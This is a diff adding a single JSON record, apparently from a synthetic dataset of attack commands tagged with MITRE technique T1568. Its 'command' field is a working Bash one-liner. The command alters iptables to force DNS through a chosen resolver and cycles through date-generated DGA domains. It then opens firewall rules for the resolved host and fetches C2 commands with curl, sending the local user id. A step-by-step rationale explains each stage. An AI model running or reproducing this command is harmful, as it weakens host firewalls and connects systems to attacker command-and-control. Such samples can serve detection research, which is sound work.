@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'resolver=1.1.1.1; iptables -I OUTPUT -p udp --dport 53 -j DROP; iptables -I OUTPUT -p udp -d \"$resolver\" --dport 53 -j ACCEPT; for n in {1..5}; do d=\"$(date -u +%j%n | sha1sum | cut -c1-6)$n.sync-node.info\"; ip=$(dig @${resolver} +short \"$d\" | shuf -n1); [ -n \"$ip\" ] && { port=$(shuf -i 45000-60000 -n1); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS \"http://$d:$port/cmd?u=$(id -u)\"; break; }; done'",
+  "explanation": "Forces DNS queries to a specific resolver, then cycles through candidate DGA domains until one resolves. It configures iptables for the resolved endpoint and beacons on a random high port.",
+  "rationale_steps": [
+    "Restrict DNS to a chosen resolver using iptables",
+    "Iterate through multiple DGA candidates",
+    "Resolve domain to IP via specified resolver",
+    "Open iptables for that dynamic IP:port",
+    "Initiate C2 command pull via curl"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-ae8ffd12",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
